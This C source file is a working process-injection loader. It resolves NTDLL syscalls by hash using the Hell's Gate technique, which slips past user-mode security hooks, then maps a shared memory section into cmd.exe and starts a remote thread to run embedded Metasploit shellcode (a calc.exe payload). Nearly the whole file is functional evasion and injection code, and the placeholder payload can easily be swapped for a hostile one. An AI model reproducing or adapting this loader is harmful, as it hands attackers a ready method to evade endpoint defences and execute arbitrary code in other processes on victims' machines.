#include <stdio.h>
#include <Windows.h>
#include "Structs.h"

// Syscalls Hashes Values
#define NtCreateSectionH 0xEBAACC5960958789
#define NtMapViewOfSectionH 0x95BD908B667A3183
#define NtUnmapViewOfSectionH 0x3E02D39CDFD19706
#define NtCloseH 0xDC69941AC29AD0F6
#define NtCreateThreadExH 0x6104579068605F09

// Target process
#define TARGET_PROCESS "cmd.exe"

// VX Tables
typedef struct _VX_TABLE_ENTRY {
	PVOID   pAddress;
	DWORD64 dwHash;
	WORD    wSystemCall;
} VX_TABLE_ENTRY, * PVX_TABLE_ENTRY;

typedef struct _VX_TABLE {
	VX_TABLE_ENTRY NtCreateSection;
	VX_TABLE_ENTRY NtMapViewOfSection;
	VX_TABLE_ENTRY NtUnmapViewOfSection;
	VX_TABLE_ENTRY NtClose;
	VX_TABLE_ENTRY NtCreateThreadEx;
} VX_TABLE, * PVX_TABLE;

// Function Prototypes
PTEB RtlGetThreadEnvironmentBlock();
BOOL GetImageExportDirectory(
	_In_ PVOID                     pModuleBase,
	_Out_ PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory
);

// HellsGate functions prototype
extern VOID HellsGate(WORD wSystemCall);
extern HellDescent();

PTEB RtlGetThreadEnvironmentBlock() {
#if _WIN64
	return (PTEB)__readgsqword(0x30);
#else
	return (PTEB)__readfsdword(0x16);
#endif
}

// Djb2 function 
DWORD64 djb2(PBYTE str) {
	DWORD64 dwHash = 0xDEADC0DEDEADC0DE;
	INT c;

	while (c = *str++)
		dwHash = ((dwHash << 0x5) + dwHash) + c;

	return dwHash;
}

BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {
	// Get DOS header
	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
	if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		return FALSE;
	}

	// Get NT headers
	PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader->e_lfanew);
	if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
		return FALSE;
	}

	// Get the EAT
	*ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
	return TRUE;
}

BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry) {
	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
	PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);

	for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
		PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
		PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

		if (djb2(pczFunctionName) == pVxTableEntry->dwHash) {
			pVxTableEntry->pAddress = pFunctionAddress;

			// Quick and dirty fix in case the function has been hooked
			WORD cw = 0;
			while (TRUE) {
				// check if syscall, in this case we are too far
				if (*((PBYTE)pFunctionAddress + cw) == 0x0f && *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
					return FALSE;

				// check if ret, in this case we are also probaly too far
				if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
					return FALSE;

				// First opcodes should be :
				//    MOV R10, RCX
				//    MOV RCX, <syscall>
				if (*((PBYTE)pFunctionAddress + cw) == 0x4c
					&& *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
					&& *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
					&& *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
					&& *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
					&& *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
					BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
					BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
					pVxTableEntry->wSystemCall = (high << 8) | low;
					break;
				}

				cw++;
			};
		}
	}

	return TRUE;
}

//msf calc x64
unsigned char Payload[] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
	0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
	0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
	0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
	0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
	0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
	0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
	0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
	0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
	0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
	0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
	0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
	0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};

//source: https://cocomelonc.github.io/malware/2022/09/06/malware-tricks-23.html
int FindMyProcess(const char* ProcessName) {

	HANDLE hSnapshot;
	PROCESSENTRY32W pe;
	int pid = 0;
	BOOL hResult;

	//Dirty fix for widechar
	WCHAR wProcessName[MAX_PATH];
	MultiByteToWideChar(CP_ACP, 0, ProcessName, -1, wProcessName, MAX_PATH);

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hSnapshot) return 0;
	pe.dwSize = sizeof(PROCESSENTRY32);
	hResult = Process32FirstW(hSnapshot, &pe);
	int count = 0;

	while (hResult) {
		char currentProcess[MAX_PATH];
		WideCharToMultiByte(CP_ACP, 0, pe.szExeFile, -1, currentProcess, MAX_PATH, NULL, NULL);

		if (wcscmp(wProcessName, pe.szExeFile) == 0) {
			pid = pe.th32ProcessID;
			break;
		}
		hResult = Process32NextW(hSnapshot, &pe);
	}

	CloseHandle(hSnapshot);
	return pid;
}

// MoveMemory function - avoiding memcpy
// source: https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c
PVOID VxMoveMemory(PVOID dest, const PVOID src, SIZE_T len) {
	char* d = dest;
	const char* s = src;
	if (d < s)
		while (len--)
			*d++ = *s++;
	else {
		char* lasts = s + (len - 1);
		char* lastd = d + (len - 1);
		while (len--)
			*lastd-- = *lasts--;
	}
	return dest;
}

int main()
{
	DWORD TargetPID = FindMyProcess(TARGET_PROCESS);
	if (TargetPID == 0) {
		printf("[!] Target process not found.\n");
		return -404;
	}
	// Initialize variables

	SIZE_T				sPayloadSize = sizeof(Payload);

	HANDLE				hSection = NULL;
	HANDLE				hThread = NULL;
	PVOID				pLocalAddress = NULL,
						pRemoteAddress = NULL;
	NTSTATUS			STATUS = NULL;
	SIZE_T				sViewSize = NULL;
	LARGE_INTEGER		MaximumSize = {
						.HighPart = 0,
						.LowPart = sPayloadSize
	};

	PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
	PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
	if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA)
		return 0x1;

	// Get NTDLL module 
	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);

	// Get the EAT of NTDLL
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
		return 0x01;

	//Initialize VxTable
	VX_TABLE Table = { 0 };
	// Populate the VxTable entries with their addresses and syscall numbers
	Table.NtCreateSection.dwHash = NtCreateSectionH;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtCreateSection)) {
		return -101;
	}

	Table.NtMapViewOfSection.dwHash = NtMapViewOfSectionH;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtMapViewOfSection)) {
		return -102;
	}

	Table.NtUnmapViewOfSection.dwHash = NtUnmapViewOfSectionH;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtUnmapViewOfSection)) {
		return -103;
	}

	Table.NtClose.dwHash = NtCloseH;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtClose)) {
		return -104;
	}

	Table.NtCreateThreadEx.dwHash = NtCreateThreadExH;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtCreateThreadEx)) {
		 return -105;
	}

	// Open handle to remote process
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, TargetPID);
	if (hProcess == NULL) {
		//printf("[!] Initialize: Failed to open process.\n");
		return -403;
	}

	//Allocate local map view
	HellsGate(Table.NtCreateSection.wSystemCall);
	if ((STATUS = HellDescent(&hSection, SECTION_ALL_ACCESS, NULL, &MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0x00000000) 
	{
		//printf("[!] NtCreateSection: Failed to create section. Error: 0x%08X\n", STATUS);
		return -201;
	}

	Table.NtMapViewOfSection.dwHash = NtMapViewOfSectionH;
	HellsGate(Table.NtMapViewOfSection.wSystemCall);
	if ((STATUS = HellDescent(hSection, (HANDLE)-1, &pLocalAddress, NULL, NULL, NULL, &sViewSize, ViewShare, NULL, PAGE_READWRITE)) != 0x00000000)
	{
		//printf("[!] NtMapViewOfSection: Failed to map view of section. Error: 0x%08X\n", STATUS);
		return -202;
	}

	//Write the payload
	VxMoveMemory(pLocalAddress, Payload, sPayloadSize);

	// Allocate remote map view
	HellsGate(Table.NtMapViewOfSection.wSystemCall);
	if ((STATUS = HellDescent(hSection, hProcess, &pRemoteAddress, NULL, NULL, NULL, &sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0x00000000)
	{
		//printf("[!] NtMapViewOfSection: Failed to map view of section. Error: 0x%08X\n", STATUS);
		return -203;
	}

	//Run the payload
	Table.NtCreateThreadEx.dwHash = NtCreateThreadExH;
	HellsGate(Table.NtCreateThreadEx.wSystemCall);
	if ((STATUS = HellDescent(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pRemoteAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0x00000000)
	{
		//printf("[!] NtCreateThreadEx: Failed to create thread. Error: 0x%08X\n", STATUS);
		return -204;
	}

	//Close the handle
	Table.NtClose.dwHash = NtCloseH;
	HellsGate(Table.NtClose.wSystemCall);
	if ((STATUS = HellDescent(hSection)) != 0x00000000)
	{
		//printf("[!] NtClose: Failed to close section handle. Error: 0x%08X\n", STATUS);
		return -205;
	}

}

